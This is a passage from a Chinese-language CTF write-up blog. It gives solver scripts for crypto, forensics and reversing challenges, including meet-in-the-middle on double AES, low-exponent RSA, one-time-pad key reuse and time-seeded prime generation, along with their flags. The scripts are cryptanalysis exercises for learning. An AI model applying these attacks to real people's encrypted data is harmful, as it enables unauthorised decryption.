class="number">243</span> : <span class="number">155</span>,<span class="number">156</span> : <span class="number">156</span>,<span class="number">69</span> : <span class="number">157</span>,<span class="number">238</span> : <span class="number">158</span>,<span class="number">151</span> : <span class="number">159</span>,<span class="number">64</span> : <span class="number">160</span>,<span class="number">233</span> : <span class="number">161</span>,<span class="number">146</span> : <span class="number">162</span>,<span class="number">59</span> : <span class="number">163</span>,<span class="number">228</span> : <span class="number">164</span>,<span class="number">141</span> : <span class="number">165</span>,<span class="number">54</span> : <span class="number">166</span>,<span class="number">223</span> : <span class="number">167</span>,<span class="number">136</span> : <span class="number">168</span>,<span class="number">49</span> : <span class="number">169</span>,<span class="number">218</span> : <span class="number">170</span>,<span class="number">131</span> : <span class="number">171</span>,<span class="number">44</span> : <span class="number">172</span>,<span class="number">213</span> : <span class="number">173</span>,<span class="number">126</span> : <span class="number">174</span>,<span class="number">39</span> : <span class="number">175</span>,<span class="number">208</span> : <span class="number">176</span>,<span class="number">121</span> : <span class="number">177</span>,<span class="number">34</span> : <span class="number">178</span>,<span class="number">203</span> : <span class="number">179</span>,<span class="number">116</span> : <span class="number">180</span>,<span class="number">29</span> : <span class="number">181</span>,<span class="number">198</span> : <span class="number">182</span>,<span class="number">111</span> : <span class="number">183</span>,<span class="number">24</span> : <span class="number">184</span>,<span class="number">193</span> : <span class="number">185</span>,<span class="number">106</span> : <span class="number">186</span>,<span class="number">19</span> : <span class="number">187</span>,<span class="number">188</span> : <span class="number">188</span>,<span class="number">101</span> : <span class="number">189</span>,<span class="number">14</span> : <span class="number">190</span>,<span class="number">183</span> : <span class="number">191</span>,<span class="number">96</span> : <span class="number">192</span>,<span class="number">9</span> : <span class="number">193</span>,<span class="number">178</span> : <span class="number">194</span>,<span class="number">91</span> : <span class="number">195</span>,<span class="number">4</span> : <span class="number">196</span>,<span class="number">173</span> : <span class="number">197</span>,<span class="number">86</span> : <span class="number">198</span>,<span class="number">255</span> : <span class="number">199</span>,<span class="number">168</span> : <span class="number">200</span>,<span class="number">81</span> : <span class="number">201</span>,<span class="number">250</span> : <span class="number">202</span>,<span class="number">163</span> : <span class="number">203</span>,<span class="number">76</span> : <span class="number">204</span>,<span class="number">245</span> : <span class="number">205</span>,<span class="number">158</span> : <span class="number">206</span>,<span class="number">71</span> : <span class="number">207</span>,<span class="number">240</span> : <span class="number">208</span>,<span class="number">153</span> : <span class="number">209</span>,<span class="number">66</span> : <span class="number">210</span>,<span class="number">235</span> : <span class="number">211</span>,<span class="number">148</span> : <span class="number">212</span>,<span class="number">61</span> : <span class="number">213</span>,<span class="number">230</span> : <span class="number">214</span>,<span class="number">143</span> : <span class="number">215</span>,<span class="number">56</span> : <span class="number">216</span>,<span class="number">225</span> : <span class="number">217</span>,<span class="number">138</span> : <span class="number">218</span>,<span class="number">51</span> : <span class="number">219</span>,<span class="number">220</span> : <span class="number">220</span>,<span class="number">133</span> : <span class="number">221</span>,<span class="number">46</span> : <span class="number">222</span>,<span class="number">215</span> : <span class="number">223</span>,<span class="number">128</span> : <span class="number">224</span>,<span class="number">41</span> : <span class="number">225</span>,<span class="number">210</span> : <span class="number">226</span>,<span class="number">123</span> : <span class="number">227</span>,<span class="number">36</span> : <span class="number">228</span>,<span class="number">205</span> : <span class="number">229</span>,<span class="number">118</span> : <span class="number">230</span>,<span class="number">31</span> : <span class="number">231</span>,<span class="number">200</span> : <span class="number">232</span>,<span class="number">113</span> : <span class="number">233</span>,<span class="number">26</span> : <span class="number">234</span>,<span class="number">195</span> : <span class="number">235</span>,<span class="number">108</span> : <span class="number">236</span>,<span class="number">21</span> : <span class="number">237</span>,<span class="number">190</span> : <span class="number">238</span>,<span class="number">103</span> : <span class="number">239</span>,<span class="number">16</span> : <span class="number">240</span>,<span class="number">185</span> : <span class="number">241</span>,<span class="number">98</span> : <span class="number">242</span>,<span class="number">11</span> : <span class="number">243</span>,<span class="number">180</span> : <span class="number">244</span>,<span class="number">93</span> : <span class="number">245</span>,<span class="number">6</span> : <span class="number">246</span>,<span class="number">175</span> : <span class="number">247</span>,<span class="number">88</span> : <span class="number">248</span>,<span class="number">1</span> : <span class="number">249</span>,<span class="number">170</span> : <span class="number">250</span>,<span class="number">83</span> : <span class="number">251</span>,<span class="number">252</span> : <span class="number">252</span>,<span class="number">165</span> : <span class="number">253</span>,<span class="number">78</span> : <span class="number">254</span>,<span class="number">247</span> : <span class="number">255</span>&#125;</span><br><span class="line"><span class="comment"># print(&quot;&#123;&quot;)</span></span><br><span class="line"><span class="comment"># for i in range(256):</span></span><br><span class="line"><span class="comment">#   print((169*i+160)%256,&quot;:&quot;, i, end=&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">#   print(&#x27;,&#x27;, end=&#x27;&#x27;)</span></span><br><span class="line"><span class="comment"># print(&quot;&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">plain = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">  plain += <span class="built_in">bytes</span>([table[i]])</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.pdf&#x27;</span>,<span class="string">&#x27;wb+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(plain)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;succesas&quot;</span>)</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="meet-me-halfway"><a href="#meet-me-halfway" class="headerlink" title="meet me halfway"></a>meet me halfway</h3><p>题目是可以类似一个double AES加密，可以使用中间相遇攻击：</p>
<p>原理是加密密钥空间是可以穷尽的，因此可以加密和解密的密文和解密的密文中间相遇来破解密文。</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = <span class="string">&#x27;945e46f641e89b5ee6f15347fa3d9a5e&#x27;</span></span><br><span class="line">dt = json.loads(<span class="built_in">input</span>().strip())</span><br><span class="line">pt = <span class="built_in">bytes</span>.fromhex(dt[<span class="string">&#x27;pt&#x27;</span>])</span><br><span class="line">enc = <span class="string">&#x27;e1bd399e40ca60f25c65c2c0cc78e5f5&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_enc</span>(<span class="params">data, key</span>):</span><br><span class="line">    cipher = AES.new(key, mode=AES.MODE_ECB)</span><br><span class="line">    ct = cipher.encrypt(pad(data, <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> ct.<span class="built_in">hex</span>()</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_dec</span>(<span class="params">data, key</span>):</span><br><span class="line">    cipher = AES.new(key, mode=AES.MODE_ECB)</span><br><span class="line">    ct = cipher.decrypt(data)</span><br><span class="line">    <span class="keyword">return</span> ct.<span class="built_in">hex</span>()</span><br><span class="line">aa = []</span><br><span class="line">ff = my_dec(<span class="built_in">bytes</span>.fromhex(enc), <span class="string">b&#x27;a4a7cyb3rXm45!@#&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> alphabet:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> alphabet:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> alphabet:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> alphabet:</span><br><span class="line">                <span class="comment"># tmp = b&#x27;&#x27;</span></span><br><span class="line">                tmp = (<span class="built_in">chr</span>(a)+<span class="built_in">chr</span>(b)+<span class="built_in">chr</span>(c)+<span class="built_in">chr</span>(d))</span><br><span class="line">                tmp =  <span class="built_in">bytes</span>(tmp, encoding = <span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">                key1 = const+tmp</span><br><span class="line">                <span class="keyword">if</span> (my_enc(<span class="string">b&#x27;22&#x27;</span>, key1))==ff:</span><br><span class="line">                    <span class="built_in">print</span>(key1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> alphabet:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> alphabet:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> alphabet:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> alphabet:</span><br><span class="line">                <span class="comment"># tmp = b&#x27;&#x27;</span></span><br><span class="line">                tmp = (<span class="built_in">chr</span>(a)+<span class="built_in">chr</span>(b)+<span class="built_in">chr</span>(c)+<span class="built_in">chr</span>(d))</span><br><span class="line">                tmp =  <span class="built_in">bytes</span>(tmp, encoding = <span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">                key2 = tmp+const</span><br><span class="line">                dd = my_dec(<span class="built_in">bytes</span>.fromhex(enc), key2)</span><br><span class="line">                <span class="keyword">if</span> dd <span class="keyword">in</span> aa:</span><br><span class="line">                    <span class="built_in">print</span>(key2)</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">key1=<span class="string">b&#x27;cyb3rXm45!@#de99&#x27;</span></span><br><span class="line">key2 = <span class="string">b&#x27;a4a7cyb3rXm45!@#&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data, key1, key2</span>):</span><br><span class="line">    cipher = AES.new(key2, mode=AES.MODE_ECB)</span><br><span class="line">    ct = cipher.decrypt(data)</span><br><span class="line">    cipher = AES.new(key1, mode=AES.MODE_ECB)</span><br><span class="line">    ct = cipher.decrypt(ct)</span><br><span class="line">    <span class="keyword">return</span> ct.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">enc = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;44f69714caa68aeb2885e5f131c04fd24c403824198fdd7031c3a8fa7e5acc554c9dc83abbdf34ba405ddc4004c6709bb310694ac6c244d7973292d96af8f6ab8809603906420e3565b43e5b71be95994ba100ed9a00491e5c293a9cd4e618bb&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(decrypt(enc, key1, key2)))</span><br></pre></td></tr></table></figure>
<p>flag: <code>HTB&#123;m337_m3_1n_7h3_m1ddl3_0f_3ncryp710n&#125;</code></p>
<hr>
<h3 id="Missing-Reindeer"><a href="#Missing-Reindeer" class="headerlink" title="Missing Reindeer"></a>Missing Reindeer</h3><p>使用文本编辑器打开文件eml文件，得到key文件和加密base64加密后的密文：</p>
<p><img src="https://s2.loli.net/2022/01/02/OqKibGdoATcDJak.png" alt="image"></p>
<p>邮件提取public.der, 用openssl解析得到：</p>
<p><code>openssl rsa -pubin -text -modulus -in public.der</code> </p>
<p><img src="https://s2.loli.net/2022/01/02/TaktBiSX3rWOcVs.png" alt="image"></p>
<p>低指数攻击：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">0xE623972884B1F4D722BDD5EE5BEB84CB84760C2ED0FFAFD93CD6030FB20D7930903BD1731DC74C954A23075303DFD71B885CD66E985BF759ED17A985F7E7D837C857BD31A147D74DA261492858FA5FCFB89230878EF4FFFCFF92FC292989326454AFB51BB7AB253FEFD5B357BF83A639F153204AFC5628F3E02022C6949DC23CB19D2FD639B6D5987AC332A01DD23B437A6777BB967F80E522E941E5F972160AED556DB7393919806422AE1A7DC9B19996FDB7B29141472D6803DFF42A713DB57AC078FCA48D1A6861423DE3A12ED9CFAFB831E5D69B92D71963D023228C2612EA334A652C46121F505D1B5A551224C69FC8239CFE1093DE68095F7153159667</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = bytes_to_long(base64.b64decode(<span class="string">&quot;Ci95oTkIL85VWrJLVhns1O2vyBeCd0weKp9o3dSY7hQl7CyiIB/D3HaXQ619k0+4FxkVEksPL6j3wLp8HMJAPxeA321RZexR9qwswQv2S6xQ3QFJi6sgvxkN0YnXtLKRYHQ3te1Nzo53gDnbvuR6zWV8fdlOcBoHtKXlVlsqODku2GvkTQ/06x8zOAWgQCKj78V2mkPiSSXf2/qfDp+FEalbOJlILsZMe3NdgjvohpJHN3O5hLfBPdod2v6iSeNxl7eVcpNtwjkhjzUx35SScJDzKuvAv+6DupMrVSLUfcWyvYUyd/l4v01w+8wvPH9l&quot;</span>))</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    tmp = (i*n)+c</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> gmpy2.iroot(tmp, e)[<span class="number">1</span>]:</span><br><span class="line">        <span class="built_in">print</span>(gmpy2.iroot(tmp, e)[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="number">1557557083543814172336607163260092833421057646019104960727073356364066073441281899179702244042726263049650591998409092023301232930288444853604698625348475061214874927442198998278165154227631741</span>))</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/01/02/Zu7Cyj4J6BhNT8i.png" alt="image"></p>
<p>flag:<code>HTB&#123;w34k_3xp0n3n7_ffc896&#125;</code></p>
<hr>
<h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="baby-APT"><a href="#baby-APT" class="headerlink" title="baby APT"></a>baby APT</h3><p>简单流量分析：</p>
<p><img src="https://s2.loli.net/2022/01/02/RCDJl3zIeZx94LP.png" alt="image"></p>
<p>解base64：</p>
<p><img src="https://s2.loli.net/2022/01/02/PRaML2OVpd1hSJQ.png" alt="image"></p>
<p>flag : <code>HTB&#123;0k_n0w_3v3ry0n3_h4s_t0_dr0p_0ff_th3ir_l3tt3rs_4t_th3_p0st_0ff1c3_4g41n&#125;</code></p>
<hr>
<h3 id="giveaway"><a href="#giveaway" class="headerlink" title="giveaway"></a>giveaway</h3><p>宏中藏有flag：</p>
<p><img src="https://s2.loli.net/2022/01/02/c3FmwaMt2V5sS7Y.png" alt="image"></p>
<p>flag:<code>HTB&#123;Th1s_1s_4_pr3s3nt_3v3ryb0dy_w4nts_f0r_chr1stm4s&#125;</code></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>HTB</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>toxin</title>
    <url>/2021/10/07/CTF/toxin/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="d981fc74f311fb469064cc6060e581ffd647888b6557a037ef2fe9a35d0f5ea6"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">HTB{tc****.................................................****Ng!!!}</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>hackthebox</tag>
        <tag>UAF</tag>
        <tag>format_string</tag>
      </tags>
  </entry>
  <entry>
    <title>几道题目记录</title>
    <url>/2021/06/23/CTF/%E5%87%A0%E9%81%93%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>主要记录一下几道题目，不记得哪个CTF比赛的题了。</p>
<h2 id="easy-RAS"><a href="#easy-RAS" class="headerlink" title="easy_RAS"></a>easy_RAS</h2><p>文件内容包括：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">n:<span class="number">0</span>x9371c61a2b760109781f229d43c6f05b58de65aa2a674ff92334cb5219132448d72c1293c145eb6f35e58791669f2d8d3b6ce506f4b3543beb947cf119f463a00bd33a33c4d566c4fd3f4c73c697fa5f3bf65976284b9cc96ec817241385d480003cdda9649fa0995b013e66f583c9a9710f7e18396fbf461cb31720f94a0f79L</span><br><span class="line">e:<span class="number">0</span>x3</span><br><span class="line"><span class="function"><span class="title">encrypt</span><span class="params">(m)</span></span>:<span class="number">0</span>x5f4e03f28702208b215f39f1c8598b77074bfa238dfb9ce424af7cc8a61f7ea48ffbbd5a5e1a10f686c3f240e85d011f6c8b968d1d607b2e1d5a78ad6947b7d3ec8f33ad32489befab601fe745164e4ff4aed7630da89af7f902f6a1bf7266c9c95b29f2c69c33b93a709f282d43b10c61b1a1fe76f5fee970780d7512389fd1L</span><br><span class="line"><span class="function"><span class="title">encrypt</span><span class="params">(m+<span class="number">1</span>)</span></span>:<span class="number">0</span>x5f4e03f28702208b215f39f1c8598b77074bfa238dfb9ce424af7cc8a61f7ea48ffc5c26b0c12bcff9f697f274f59f0e55a147768332fc1f1bac5bbc8f9bb508104f232bdd20091d26adc52e36feda4a156eae7dce4650f83fabc828fdcfb01d25efb98db8b94811ca855a6aa77caff991e7b986db844ff7a140218449aaa7e8L</span><br></pre></td></tr></table></figure>
<p>考的点是<code>RSA</code>算法，已知n、e、m和m+1, 计算明文。已知</p>
<script type="math/tex; mode=display">
(m ^ e) = k_1*n+encrypt(m)</script><p>和</p>
<script type="math/tex; mode=display">
(m+1)^e =k_2*n+encrypt(m+1)</script><p>联立两个方程，相减，可以得出，其中，两个k可以视为相等，因为两个加密的数据相近：</p>
<script type="math/tex; mode=display">
(m+1)^3-m^3=(encrypt(m+1)-encrypt(m))</script><p>化简得：</p>
<script type="math/tex; mode=display">
3m(m+1)=(encrypt(m+1)-encrypt(m))-1</script><p>可以将<code>m+1</code>视为<code>m</code>，粗略计算出m的范围，然后通过一步步爆破每个字符来计算密码，解密脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">N =  <span class="number">0x9371c61a2b760109781f229d43c6f05b58de65aa2a674ff92334cb5219132448d72c1293c145eb6f35e58791669f2d8d3b6ce506f4b3543beb947cf119f463a00bd33a33c4d566c4fd3f4c73c697fa5f3bf65976284b9cc96ec817241385d480003cdda9649fa0995b013e66f583c9a9710f7e18396fbf461cb31720f94a0f79</span></span><br><span class="line">c1 = <span class="number">0x5f4e03f28702208b215f39f1c8598b77074bfa238dfb9ce424af7cc8a61f7ea48ffbbd5a5e1a10f686c3f240e85d011f6c8b968d1d607b2e1d5a78ad6947b7d3ec8f33ad32489befab601fe745164e4ff4aed7630da89af7f902f6a1bf7266c9c95b29f2c69c33b93a709f282d43b10c61b1a1fe76f5fee970780d7512389fd1</span></span><br><span class="line">c2 = <span class="number">0x5f4e03f28702208b215f39f1c8598b77074bfa238dfb9ce424af7cc8a61f7ea48ffc5c26b0c12bcff9f697f274f59f0e55a147768332fc1f1bac5bbc8f9bb508104f232bdd20091d26adc52e36feda4a156eae7dce4650f83fabc828fdcfb01d25efb98db8b94811ca855a6aa77caff991e7b986db844ff7a140218449aaa7e8</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">c3 = c2-c1-<span class="number">1</span></span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">d1 = <span class="built_in">int</span>(c3/<span class="number">3</span>)</span><br><span class="line">p = <span class="number">0x746865206b657920000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line">q = p+<span class="number">1</span></span><br><span class="line">ss = <span class="number">0x10000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line">sd = <span class="number">0x200000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line">tmp_p = p</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    tmp_p=tmp_p+sd</span><br><span class="line">    count = <span class="number">0x20</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        tmp_p+=ss</span><br><span class="line">        count +=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (tmp_p*(tmp_p+<span class="number">1</span>))&gt;d1:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> count &gt; <span class="number">0x7e</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    tmp_p = tmp_p-ss</span><br><span class="line">    sd = sd&gt;&gt;<span class="number">8</span></span><br><span class="line">    ss = ss&gt;&gt;<span class="number">8</span></span><br><span class="line">    <span class="keyword">if</span> sd==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(tmp_p)[<span class="number">2</span>:-<span class="number">1</span>].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>计算出解压密码为：<code>the key is :everything_is_easy_in_this_question</code></p>
<p>解开压缩包，发现是一个一次一密的密文：</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line"><span class="number">280316470206017</span>f5f163a3460100b111b2c254e<span class="number">103715600f13</span>,</span><br><span class="line"><span class="number">091</span>b0f471d05153811122c70340c0111053a394e0b<span class="number">39500f0a18</span>,</span><br><span class="line"><span class="number">4638080</span>a1e49243e55531a3e23161d411a362e4044<span class="number">111f374409</span>,</span><br><span class="line"><span class="number">0</span>e0d15470206017f59122935601405421d3a244e10371560140f,</span><br><span class="line"><span class="number">031</span>a08080e1a540d62327f242517101d4e2b2807<span class="number">177f13280511</span>,</span><br><span class="line"><span class="number">0</span>a090f001e491d2c111d3024601405431a36231b083e022c1d,</span><br><span class="line"><span class="number">16000406080</span>c543854077f24280144451c2a254e093a0333051a,</span><br><span class="line"><span class="number">02050701120</span>a01334553393f32441d5e1b716027<span class="number">107f19334417</span>,</span><br><span class="line"><span class="number">131</span>f15470800192f5d167f352e0716481e2b29010a<span class="number">7139600c12</span>,</span><br><span class="line"><span class="number">1609411</span>e141c543c501d7f232f0812544e2b2807177f00320b1f,</span><br><span class="line"><span class="number">0</span>a090c470a1c1d3c5a1f2670210a0011093a344e<span class="number">103715600712</span>,</span><br><span class="line"><span class="number">141</span>e04040f49153142043a22601711520d3a<span class="number">331d0826</span></span><br></pre></td></tr></table></figure>
<p>flag用于重复加密，可以利用语法和空格来计算明文：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = [<span class="number">0x280316470206017f5f163a3460100b111b2c254e103715600f13</span>,</span><br><span class="line"><span class="number">0x091b0f471d05153811122c70340c0111053a394e0b39500f0a18</span>,</span><br><span class="line"><span class="number">0x4638080a1e49243e55531a3e23161d411a362e4044111f374409</span>,</span><br><span class="line"><span class="number">0x0e0d15470206017f59122935601405421d3a244e10371560140f</span>,</span><br><span class="line"><span class="number">0x031a08080e1a540d62327f242517101d4e2b2807177f13280511</span>,</span><br><span class="line"><span class="number">0x0a090f001e491d2c111d3024601405431a36231b083e022c1d</span>,</span><br><span class="line"><span class="number">0x16000406080c543854077f24280144451c2a254e093a0333051a</span>,</span><br><span class="line"><span class="number">0x02050701120a01334553393f32441d5e1b716027107f19334417</span>,</span><br><span class="line"><span class="number">0x131f15470800192f5d167f352e0716481e2b29010a7139600c12</span>,</span><br><span class="line"><span class="number">0x1609411e141c543c501d7f232f0812544e2b2807177f00320b1f</span>,</span><br><span class="line"><span class="number">0x0a090c470a1c1d3c5a1f2670210a0011093a344e103715600712</span>,</span><br><span class="line"><span class="number">0x141e04040f49153142043a22601711520d3a331d0826</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="number">0x666c61677b69745f31735f50406464316e5f406e645f7040647d</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">0</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(flag)[<span class="number">2</span>:-<span class="number">1</span>].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    a+=<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(i)</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(flag)</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(i^flag)[<span class="number">2</span>:-<span class="number">1</span>].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>flag:<code>flag&#123;it_1s_P@dd1n_@nd_p@d&#125;</code></p>
<h2 id="ezmath"><a href="#ezmath" class="headerlink" title="ezmath"></a>ezmath</h2><p>ezmath是国赛的一道逆向题，这道题的考点是一个数学题，但是题目存在一定的问题，输入的值就算是正确的flag也无法通过。</p>
<p>查看主函数代码逻辑：</p>
<p><img src="https://i.loli.net/2021/06/23/ylDxrgjcB8vaZW5.png" alt="image-20210623195537809"></p>
<p>其中，<code>sub_13F3</code>函数可以视为一个加密函数，加密的结果与<code>dbl_4020</code>处的值进行比较：</p>
<p><img src="https://i.loli.net/2021/06/23/74kmH8B3aFNIZ1K.png" alt="image-20210623195851166"></p>
<p><code>sub_13F3</code>函数：</p>
<p><img src="https://i.loli.net/2021/06/23/LRfGosIbSZFV58A.png" alt="image-20210623195930793"></p>
<p>这是一个简单的循环逻辑。</p>
<p>函数总的逻辑就是将输入的flag两个字符转为一个数值，例如’fl’=&gt;0x666c</p>
<p>循环次数是从2021一直到转换到这个数值，存在的问题是，这个循环次数太多，导致最后的生成的数据无限大，所以常规的分析无法实现。</p>
<p>同对数据随意进行操作，我发现，可以让<code>2.718281828459045</code>除以结果，得到值非常像flag，所以：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v3 = <span class="number">0.0004829108052495089</span></span><br><span class="line">table = [<span class="number">0.00009794904266317233</span>, <span class="number">0.00010270456917442</span>, <span class="number">0.00009194256152777895</span>,</span><br><span class="line"> <span class="number">0.0001090322021913372</span>, <span class="number">0.0001112636336217534</span>, <span class="number">0.0001007442677411854</span>,</span><br><span class="line"> <span class="number">0.0001112636336217534</span>, <span class="number">0.0001047063607908828</span>, <span class="number">0.0001112818534005219</span>,</span><br><span class="line"> <span class="number">0.0001046861985862495</span>, <span class="number">0.0001112818534005219</span>, <span class="number">0.000108992856167966</span>,</span><br><span class="line"> <span class="number">0.0001112636336217534</span>, <span class="number">0.0001090234561758122</span>, <span class="number">0.0001113183108652088</span>,</span><br><span class="line"> <span class="number">0.0001006882924839248</span>, <span class="number">0.0001112590796092291</span>, <span class="number">0.0001089841164633298</span>,</span><br><span class="line"> <span class="number">0.00008468431512187874</span>]</span><br><span class="line">tt = <span class="number">2.718281828459045</span></span><br><span class="line"><span class="comment"># for i in table:</span></span><br><span class="line"><span class="comment">#     print(tt)</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">    a = <span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(tt/i)-<span class="number">1</span>)[<span class="number">2</span>:<span class="number">4</span>],<span class="number">16</span>))</span><br><span class="line">    b = <span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(tt/i)-<span class="number">1</span>)[<span class="number">4</span>:<span class="number">6</span>],<span class="number">16</span>))</span><br><span class="line">    flag+=b</span><br><span class="line">    flag+=a</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p>flag:<code>flag&#123;saam_dim_gei_lei_jam_caa_sin_laa&#125;</code></p>
<h2 id="某个不记得出处的密码题"><a href="#某个不记得出处的密码题" class="headerlink" title="某个不记得出处的密码题"></a>某个不记得出处的密码题</h2><p>题目：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_prime</span>(<span class="params">bits</span>):</span><br><span class="line">    x = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> gmpy2.is_prime(x) == <span class="literal">False</span>:</span><br><span class="line">        random.seed(<span class="built_in">round</span>(time.time(),<span class="number">5</span>))</span><br><span class="line">        x = random.getrandbits(bits)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">hint = <span class="string">&quot;&quot;</span></span><br><span class="line">a1 = time.time()</span><br><span class="line">flag = <span class="string">&quot;flag&#123;***************&#125;&quot;</span></span><br><span class="line">p = get_prime(<span class="number">2048</span>)</span><br><span class="line">q = get_prime(<span class="number">2048</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line"><span class="keyword">assert</span> n &gt; m</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">hint+=<span class="built_in">str</span>(time.localtime())</span><br><span class="line">hint+=<span class="built_in">str</span>(time.time()-a1)</span><br><span class="line"></span><br><span class="line">m2 = bytes_to_long(hint.encode())</span><br><span class="line">e2 = <span class="number">196611</span></span><br><span class="line">p2 = getPrime(<span class="number">1024</span>)</span><br><span class="line">q2 = gmpy2.next_prime(p2)</span><br><span class="line">n2 = p2*q2</span><br><span class="line"><span class="keyword">assert</span> n2 &gt; m2</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2,e2,n2)</span><br><span class="line"><span 